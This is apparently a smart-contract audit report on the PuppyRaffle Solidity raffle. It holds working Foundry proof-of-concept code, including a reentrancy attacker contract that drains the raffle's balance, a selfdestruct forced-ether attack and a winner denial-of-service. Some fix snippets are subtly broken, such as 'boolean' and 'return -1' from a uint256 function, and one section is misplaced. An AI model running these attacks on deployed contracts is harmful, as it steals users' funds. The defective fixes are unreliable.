---
title: PuppyRaffle Audit Report
author: FalseGenius
date: April 24, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape FalseGenius\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [FalseGenius](https://github.com/FalseGenius)
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.


# Risk Classification

|            |        | Impact |        |     |     
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 
**The findings described in this document correspond to the following commit hash:**

```
22bbbb2c47f3f2b78c1b134590baf41383fd354f
```

## Scope 

```
./src/
#-- PuppyRaffle.sol
```
## Roles
- Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
- Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

# Executive Summary
*I loved auditing this codebase. I spent 1~2 days using Foundry tests, Slither, Aderyn and Manual Review for the Audit*

## Issues found

| Severity      | Number of Issues Found |
| ------------- | ---------------------- |
| High          | 4                      |
| Medium        | 3                      |
| Low           | 3                      |
| Gas           | 2                      |
| Informational | 8                      |
| Total         | 20                     |


# Findings

## High

### [H-01] Reentrancy attack in `PuppyRaffle::refund()` enables entrant to drain the contract balance.

**Description:** `PuppyRaffle::refund()` allows players to refund their deposits by initiating external call first and subsequently setting the user's address to zero in `PuppyRaffle::players()` . This introduces a vulnerability to Reentrancy attack, where attacker could deploy a contract with a malicious fallback() function to retrigger`PuppyRaffle::refund()`. Since user remains in `PuppyRaffle::players()` at this point, they would successfully pass all checks, leading to repeated executions of sendValue, ultimately draining the contract.

```javascript
@>      payable(msg.sender).sendValue(entranceFee); // Reentrancy here
        players[playerIndex] = address(0);
```

**Impact:** The reentrancy vulnerability could result in a significant drain on contract's balance, potentially leading to financial losses for the contract owner and participants.

**Proof of Concept:** We set up an ReentrancyAttack contract with a malicious receive() function, have it enter PuppyRaffle with 4 other players and call refund() on it, with the following result,

- *puppyRaffle balance before attack: 5000000000000000000*
- *attackContract balance before attack: 0*
- *puppyRaffle balance after attack: 0*
- *attackContract balance after attack: 5000000000000000000*

<details>

<summary>Code</summary>

```javascript

    function testReentrancyInRefundFunction() public playersEntered {
        address alice = makeAddr("alice");
        deal(alice, 1 ether);
        vm.prank(alice);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));

        address[] memory arr = new address[](1);
        arr[0] = address(attacker);
        
        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value:entranceFee}(arr);

        console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance before attack: %s", address(attacker).balance);

        assertEq(address(puppyRaffle).balance, 5 ether);
        assertEq(address(attacker).balance, 0);

        vm.prank(alice);
        attacker.setIdx();

        vm.startPrank(address(attacker));
        uint256 idx = puppyRaffle.getActivePlayerIndex(address(attacker));
        puppyRaffle.refund(idx);
        vm.stopPrank();

        console.log("puppyRaffle balance after attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance after attack: %s", address(attacker).balance);
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attacker).balance, 5 ether);

    }

    contract ReentrancyAttacker {
        PuppyRaffle public raffle;
        uint256 constant entranceFee = 1e18;
        uint256 public idx;

        address private owner;

        modifier onlyOwner() {
            require(msg.sender == owner, "You are not the owner");
            _;
        }

        constructor(address _raffle) payable {
            raffle = PuppyRaffle(_raffle);
            owner = msg.sender;
        }

        function setIdx() external onlyOwner {
            idx = raffle.getActivePlayerIndex(address(this));
        }

        function destruct(address _address) external onlyOwner {
            selfdestruct(payable(_address));
        }      

        receive() external payable {
            if (address(raffle).balance > 0) {
                raffle.refund(idx);
            }
        }
    }

```
</details>


**Recommended Mitigation:** You can go for one of the following counter measures,

1. Follow the CEI (Cases, Effects, Interactions) pattern. For the  `PuppyRaffle::refund()`, cover the checks first. Set the states after that. Make external calls at the end. So have `PuppyRaffle::refund()` update  `players` array before making the external call.
```diff

    function refund(uint256 playerIndex) public {
            // Checks
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            // Effects
+           players[playerIndex] = address(0);

            // External Calls
            payable(msg.sender).sendValue(entranceFee);

-           players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }

```

2. Consider using NonReentrant() modifier provided by OpenZeppelin contract.

```diff
+   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

-   contract PuppyRaffle {
+   contract PuppyRaffle is ReentrancyGuard {
    // Rest of the code

-    function refund(uint256 playerIndex) public {}
+    function refund(uint256 playerIndex) public nonReentrant {}

    // Rest of the code
    }

```


### [H-02] Insecure randomness generation in `PuppyRaffle::selectWinner()` is exploitable by miner, making it predictable and taking away the randomness from the function, and predict the winning puppy.

**Description:** The winner is selected by relying on user address, block timestamp and block difficulty in `PuppyRaffle::selectWinner()`. This approach presents a vulnerability that can be exploited by a miner to some extent. By manipulating the timestamp, difficulty and mining for an address that would allow them to predict the outcome of the selection process; they will know ahead of time the values of time, difficulty and address, thereby choosing winner of the Raffle to be themselves, compromising the randomness and fairness of the function.

*Note:* This additionally means, users could front-run `refund()` if they see that they are not the winner.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
@>       uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        // Rest of the code
    }
```

**Impact:** The miner can influence winner of the Raffle, selecting the `rarest` puppy, making the Raffle a gas war as who wins the raffles.

**Proof of Concept:** 

1. Validators/Miners could know ahead of time the `block.timestamp` and `block.difficulty`, and use it to predict when to participate. See the blog on [Solidity: Prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced by `block.prevrandao`.
2. Validators/Miners can mine/manipulate their `msg.sender` to result in their address generated as the winner.
3. Users can revert the transaction if they do not like the winner of resulting puppy.

**Recommended Mitigation:** Do not use block.timestamp, now or blockhash as a source of randomness. Consider using cryptographically-generated random number generator such as Chainlink VRF.

### [H-03] `PuppyRaffle::totalFees` in `PuppyRaffle::selectWinner()` overflows when it stores amount greater than ~18.4e18, incorrectly reflecting the amount stored in the contract, making the `PuppyRaffle::withdrawFees()` inoperable.

**Description:** The `PuppyRaffle::totalFees` is of type uint64 and it can hold up to `18446744073709551615~ 18.4 ether approx`; the maximum value a uin64 variable can hold. If the contract gets a lot of deposits and `PuppyRaffle::totalFees` exceeds maximum value of uint64, its value wraps around and starts from 0, thereby it is susceptible to overflow. This leads to an incorrect representation of contract balance, and it directly affects `PuppyRaffle::withdrawFees()`, as the `PuppyRaffle::feeAddress` cannot withdraw fees if totalFees is not equivalent to contract balance.

**Impact:** Due to the overflow in `PuppyRaffle::totalFees`, the contract will never truly be empty, even if the actual balance exceeds maximum value stored. Additionally, it limits feeAddress's ability to withdraw any funds and may hinder operational capabilities of PuppyRaffle platform.

**Proof of Concept:** Have 93 players enter the contract, resulting in 93 ether getting deposited into PuppyRaffle.
1. *PrizePool:  (totalAmountCollected * 80) / 100 => 93 * 0.8 => 74.4 ether.*
2. *Expected totalFees: (totalAmountCollected * 20) / 100 => 93 * 0.2 => 18.6 ether.*
3. *Contract Balance: 18.6 ether.*
4. *Actual totalFees: 153255926290448384 ~ 0.15 ether*

<details>

<summary>PoC</summary>

```javascript
    function testArithmeticOverlowInSelectWinner() public playersEntered {
        address alice = makeAddr("alice");
        aliceEntered(alice);

        address[] memory playerx = new address[](88);
        for (uint256 idx=0; idx < 88; idx++) {
            address player = address(uint160(idx+5));
            playerx[idx] = player;
        }

        vm.prank(alice);
        puppyRaffle.enterRaffle{value:entranceFee * playerx.length}(playerx);

        // Contract balance before: 93e18
        console.log("Contract balance before: %s", address(puppyRaffle).balance);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        // Total fees: 153255926290448384 ~ 0.15 ether. 
        // Actual Contract balance: 18600000000000000000 ~ 18.6 ether
        console.log("Total fees: %s", puppyRaffle.totalFees());
        console.log("Actual Contract balance: %s", address(puppyRaffle).balance);

        /**
         * @notice Overflow!
         * totalFees is uint64 and type(uint64).max is 18.4 ether. Any value beyond that overflows
         * Desired totalFees 93 * 0.2 ~= 18.6 ether 
         * Actual totalFees: 153255926290448384 ~ 0.15 ether
         *  Actual contract balance: 18.6 ether
         */

        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }

```
</details>

**Recommended Mitigation:** Consider using newer versions of solidity, or using uint256 variable types that can hold large values when dealing with tokens.

A better approach would be using `SafeMath` library of OpenZeppelin for arithmetics. Either that, or remove the balance check from `withdrawFees`.

### [H-04] Malicious Winner can halt the raffle forever

**Description:** Once the winner is chosen, the `PuppyRaffle::selectWinner()` sends prizePool via external call to winner account and mints the NFT,

```javascript
    _safeMint(winner, tokenId);

    // ERC721 function
    function _safeMint(address to, uint256 tokenId, bytes memory _data) internal virtual {
        _mint(to, tokenId);
        require(_checkOnERC721Received(address(0), to, tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
    }
```
This `_safeMint` is inherited from ERC721. If the winner is a smart contract, it expects the contract to have `onERC721Received` hook implemented. Otherwise, it reverts! If all the players entered are smart contracts without the `onERC721Received` hook, raffle would halt forever.


**Impact:** It would be impossible to start a new round, and no new players would be able to enter the Raffle.

**Proof of Concept:** Have 4 smart contract address, with no `onERC721Received` implementation, join the raffle.

<details>

<summary>PoC</summary>

```javascript

    function testSelectWinnerDOS() public { 

        // The 4 contracts below does not implement onERC721Received hook to receive the NFT
        address[] memory players = new address[](4);
        players[0] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[1] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[2] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        players[3] = (address(new ReentrancyAttacker(address(puppyRaffle))));
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
    
```

</details>


**Recommended Mitigation:** Consider adding a `claimPrize` function that winners would be able to call themselves to collect the prize fees. If they do not have `onERC721Received`, it would only impact them.

### [M-01] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle()` function is a potential Denial-of-service (DoS) attack, incrementing gas costs for future players.

**Description:** The `PuppyRaffle::enterRaffle()` function checks for address duplicates using an unbounded for-loop which causes gas-costs to blow up, since the longer the `PuppyRaffle::players` array is, the more checks new players will have to make. This means, gas costs for players entering the raffle when the Raffle starts will be dramatically lower than those who enter later. Every additional address that gets added to players array results in additional duplicate address check that loop will have to make.

```javascript
    // DoS here due to unbounded for-loop
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }

```

**Impact:** The gas costs for entrants will greatly increases as more players join the raffle, discouraging later users from entering, causing a rush when Raffle starts, to be one of the first entrants.

**Proof of Concept:** If we have two sets of 100 players enter, the gas costs would be,

- *Gas consumed by 100 players: 6385604*
- *Gas consumed by next 100 players: 18387894*

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffleTest.t.sol`

```javascript

function testDosOnEnterRaffle() public {
    address playerZero = address(uint160(1000));
    deal(playerZero, 1 ether);
    address[] memory players = new address[](1);
    players[0] = playerZero;
    vm.prank(playerZero);
    puppyRaffle.enterRaffle{value: entranceFee * 1}(players);

    address alice = makeAddr("alice");
    deal(alice, 1 ether);


    address[] memory players2 = new address[](1);
    uint256 gasStartAlice = gasleft();
    players2[0] = alice;
    vm.prank(alice);
    puppyRaffle.enterRaffle{value: entranceFee * 1}(players2);
    uint256 gasLeftAlice = gasStartAlice - gasleft();

    // Adding 100 player to the bunch
    address[] memory playerx = new address[](100);
    for (uint256 idx; idx < playerx.length; idx++) {
        address play__er = address(uint160(idx));
        playerx[idx] = play__er;
    }
    uint256 gasStartCris = gasleft();
    address cris = makeAddr("cris");
    deal(cris, 100 ether);
    vm.prank(cris);  
    puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);
    uint256 gasLeftCris = gasStartCris - gasleft();


    // Gas consumed by next 100 players
    uint256 count = 0;
    address[] memory playerz = new address[](100);
    for (uint256 idx; idx < playerz.length; idx++) {
        address play__er = address(uint160(idx+playerz.length));
        playerz[count] = play__er;
        count += 1;
    }

    uint256 gasStartDock = gasleft();
    address Dock = makeAddr("Dock");
    deal(Dock, 100 ether);
    vm.prank(Dock);  
    puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerz);
    uint256 gasLeftDock = gasStartDock - gasleft();


    console.log("Gas consumed by alice: %s", gasLeftAlice);
    console.log("Gas consumed by 100 players: %s", gasLeftCris);
    console.log("Gas consumed by next 100 players: %s", gasLeftDock);

    assertLt(gasLeftAlice, gasLeftCris);
    assertLt(gasLeftCris, gasLeftDock);
}

```
</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing the duplicates. Users can make new wallet addresses anyways, so a duplicate check does not prevent the same person from entering twice using different wallet address. It only checks for same wallet address.
2. Consider using mapping to check for duplicates. This would allow constant lookup for whether there is a duplicate or not.

```diff

+   mapping(address => boolean) public addressExists;

    function enterRaffle(address[] memory newPlayers) public payable {
+       // Check for duplicates
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressExists[newPlayers[i]] != true, "PuppyRaffle: Duplicate player");
+       }
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressExists[newPlayers[i]] = true;
        }

        // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
+    // Empty out the addressExists

        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        // Rest of the code...
    }

```




### [M-02] The require statement in `PuppyRaffle::withdrawFees()` function would always revert in case of discrepancies between `PuppyRaffle::totalFees` and contract balance, making it inoperable to withraw any fees.

**Description:** The require check in `PuppyRaffle::withdrawFees()` makes the function inoperable in case of overflows (totalFees is susceptible to it), or receiving ether from a malicious contract using selfdestruct.

**Impact:** Due to the discrepancy, the contract will never truly be empty, and it limits `PuppyRaffle::feeAddress`' ability to withdraw any ether from the contract, resulting in operational inefficencies.

**Proof of Concept:** Add the following test to `PuppyRaffleTest.t.sol`,

<details>

<summary>PoC</summary>

```javascript

    function testCheckWithdrawalInoperability() public playersEntered {
        address alice = makeAddr("alice");
        deal(alice, 1 ether);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // 0.8 ether -> totalFees
        puppyRaffle.selectWinner();

        // contract balance: 0.8 ether. 
        // Total fees: 0.8 ether.
        console.log("Contract balance before attack: %s" ,address(puppyRaffle).balance);
        console.log("Contract totalFees before attack: %s" ,puppyRaffle.totalFees());

        vm.startPrank(alice);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value:1 ether}(address(puppyRaffle));
        // Send 1 ether to puppy raffle through selfdestruct
        attacker.destruct(address(puppyRaffle));
        vm.stopPrank();

        // Discrepancy
        // contract balance: 1.8 ether. 
        // Total fees: 0.8 ether.
        console.log("Contract balance after attack: %s" ,address(puppyRaffle).balance);
        console.log("Contract totalFees after attack: %s" ,puppyRaffle.totalFees());

        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }

    contract ReentrancyAttacker {
        PuppyRaffle public raffle;
        uint256 constant entranceFee = 1e18;
        uint256 public idx;

        address private owner;

        modifier onlyOwner() {
            require(msg.sender == owner, "You are not the owner");
            _;
        }

        constructor(address _raffle) payable {
            raffle = PuppyRaffle(_raffle);
            owner = msg.sender;
        }

        function setIdx() external onlyOwner {
            idx = raffle.getActivePlayerIndex(address(this));
        }

        function destruct(address _address) external onlyOwner {
            selfdestruct(payable(_address));
        }

        receive() external payable {
            if (address(raffle).balance > 0) {
                raffle.refund(idx);
            }
        }
    }

```
</details>


**Recommended Mitigation:** Consider updating the require statement so it reverts only when contract balance is less than total fees accumulated.

```diff

    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+       require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }

```

### [M-03] Smart contract wallets without `receive` or `fallback` function will block the start of a new contest.

**Description:** The `PuppyRaffle::selectWinner()` is reponsible for resetting players array and start a new contest. However, if winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Users could easily call `selectWinner()` function again and EOAs could enter, but this would be gas extensive due to duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner()` could revert many times, making lottery reset difficult.

**Proof of Concept:** 

1. 10 smart contract wallets enter PuppyRaffle without receive or fallback.
2. The lottery ends.
3. The `selectWinner()` wouldn't work even though lottery has ended.

**Recommended Mitigation:** There are a few recommendations to this,

1. Do not allow smart contract wallets to enter (Not recommended).
2. Create a mapping of addresses to payout amounts so winners could withdraw prizePool themselves with a `claimPrize` function (Recommended).

## Low

### [L-01] `PuppyRaffle::getActivePlayerIndex()` returning 0 for inactive players can mislead an active user at index 0, thereby undermining intended functionlity of the function. 

**Description:**  The `PuppyRaffle::getActivePlayerIndex()` incorrectly indicates that a user is inactive by returning 0 if they are not found in `PuppyRaffle::players` array. This behavior poses a problem because it can mislead an active user at index 0 into believing that they are inactive, thereby preventing them from triggering a refund. This undermines the intended functionality of the function, as it should accurately identify active users for a refund.

**Impact:** This has significant implications for fairness of the PuppyRaffle contract. Any user at index 0 could be erroneously denied an opportunity to trigger a refund, which undermines contract fairness and user experience.

**Proof of concept:** 

1. User enters the Raffle. They are the first entrant.
2. `PuppyRaffle::getActivePlayerIndex()` returns 0.
3. User thinks they have not entered correctly due to User Documentation.
4. They enter again, wasting gas.

**Recommended Mitigation:** The easiest recommendation would be to revert if the user is not found in the array instead of returning 0.

You could also consider modifying the `PuppyRaffle::getActivePlayerIndex()` function to return a value that clearly indicates when a user is not found in the `PuppyRaffle::players` array. One common approach is to use a sentinel value, such as a `-1` to represent "Not found" or "inactive".

```diff
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }

+       return -1;
-       return 0;
    }

```



**Impact:** A malicious miner can manipulate the outcome, rigging the results in favor of themselves or others, compromising the trust of participants and authenticity, leading to reputational damage.

**Proof of Concept:**

**Recommended Mitigation:** Consider using verified randomness oracle like Chainlink VRF.



### [L-02] Casting uint256 fee as uint64 in `PuppyRaffle::selectWinner()` is a potential unsafe casting vulnerability, truncating fee into a representable value for uint64, adding incorrect amount to `PuppyRaffle::totalFees`.

**Description:** The max value uint64 can hold is 18446744073709551615 ~ 18.4e18. Any number beyond that is susceptible to overflow. The fee calculated in `PuppyRaffle::selectWinner()` is of type uint256 and that value gets truncated when it is casted off as uint64, resulting in incorrect calculation of the totalFees.

**Impact:** The unsafe casting of uint256 fee into uint64 in `PuppyRaffle::selectWinner()` leads to an incorrect calculation of the total fees stored in `PuppyRaffle::totalFees`. This compromises the accuracy of fee tracking within the contract, resulting in potential financial discrepancies.

**Proof of Concept:**

1. Launch Chisel (a component of foundry toolkit) with the command:
```
chisel
```

2. Save 20e18 amount (An amount greater than what uint64 can hold) to a variable.
```
uint256 amount = 20e18;
```

3. Cast amount as uint64
```
uint64 castedValue = uint64(amount);
```

4. Check the value of castedValue
```
castedValue
```

- *Result: 1553255926290448384 ~ 1.5e18.

So 20e18 gets casted as 1.5e18 due to overflow.

**Recommended Mitigation:** There are few adjustments to consider.

1. Consider using SafeMath library provided by OpenZeppelin for arithmetic operations, preventing any potential underflows/overflows. 
2. Use a different data type to accomodate larger values i.e., uint256.

### [L-03] Event is missing `indexed` fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

- Found in src/PuppyRaffle.sol [Line: 58](src/PuppyRaffle.sol#L58)

	```solidity
	    event RaffleEnter(address[] newPlayers);
	```

- Found in src/PuppyRaffle.sol [Line: 59](src/PuppyRaffle.sol#L59)

	```solidity
	    event RaffleRefunded(address player);
	```

- Found in src/PuppyRaffle.sol [Line: 60](src/PuppyRaffle.sol#L60)

	```solidity
	    event FeeAddressChanged(address newFeeAddress);
	```






## Gas

### [G-01] Unchanged state variables should be declared constant or immutable.

Reading from storage is more expensive than reading from constant, or immutable.

- Instances:
 `PuppyRaffle::raffleDuration` should be immutable.
 `PuppyRaffle::commonImageUri` should be constant.
 `PuppyRaffle::rareImageUri`  should be constant.
 `PuppyRaffle::legendaryImageUri`  should be constant.


### [G-02] Storage variables in Loops should be cached.

Consider using cached length instead of reading directly from state variable. Everytime you call `players.length`, you read from storage as opposed to reading from memory which is more gas efficient.

Instances: `PuppyRaffle::enterRaffle()`

```diff
+       uint256 playersLength = players.length;
+       for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 i = 0; i < players.length - 1; i++) {
+           for (uint256 j = i + 1; j < playersLength; j++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```


## Informational

### [I-01]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

### [I-02]: Using an older version of Solidity pragma is not recommended; use a stable version.

Consider using a stable version of Solidity in your contracts i.e., use `pragma solidity 0.8.18;`

Description
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

Recommendation
Deploy with a recent version of Solidity (at least 0.8.18) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Refer to [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity)

### [I-03]: Function `PuppyRaffle::_isActivePlayer()` is not used anywhere. 

The function `_isActivePlayer()` clutters up the code and wastes gas. Consider removing it.

```diff
-   function _isActivePlayer() internal view returns (bool) {}

```

### [I-04]: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

- Found in src/PuppyRaffle.sol [Line: 67](src/PuppyRaffle.sol#L67)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 218](src/PuppyRaffle.sol#L218)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [I-05]: Define and use `constant` variables instead of using literals

If the same constant literal value is used multiple times, create a constant state variable and reference it throughout the contract, reflecting meaning of hardcoded magic numbers in `PuppyRaffle::selectWinner()`. Hardcoded numbers are confusing.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // Other code
+   uint256 constant POOL_PERCENTAGE = 80;
+   uint256 constant FEE_PERCENTAGE = 20;
+   uint256 constant PRECISION = 100;
    function selectWinner() external {
        // Other code...

-       uint256 prizePool = (totalAmountCollected * 80) / 100;
-       uint256 fee = (totalAmountCollected * 20) / 100;
+       uint256 prizePool = (totalAmountCollected * POOL_PERCENTAGE) / PRECISION;
+       uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / PRECISION;

        // Other code...
    }
}

```

### [I-06]: `PuppyRaffle::selectWinner()` does not follow CEI, which is not the best practice

It is best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-      (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+      (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```


### [I-07]: Missing event emits in Key Raffle functions

Events should be emitted that record significant actions within the contract. `PuppyRaffle::selectWinner()` should emit an event to reflect this. 
```diff
    // Other events
+   event RaffleWinner(address indexed winner, uint256 indexed tokenId); 
    
    function selectWinner() external {
        // Other code...

+       emit RaffleWinner(winner, tokenId);
    }
```
### [I-08] Test Coverage below 90%

**Description:** The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

```
| File                         | % Lines        | % Funcs       |
|------------------------------|----------------|---------------|
| script/DeployPuppyRaffle.sol | 0.00% (0/3)    | 0.00% (0/1)   |
| src/PuppyRaffle.sol          | 82.14% (46/56) | 77.78% (7/9)  |
| test/PuppyRaffleTest.t.sol   | 100.00% (2/2)  | 100.00% (2/2) |
| Total                        | 78.69% (48/61) | 75.00% (9/12) |
```
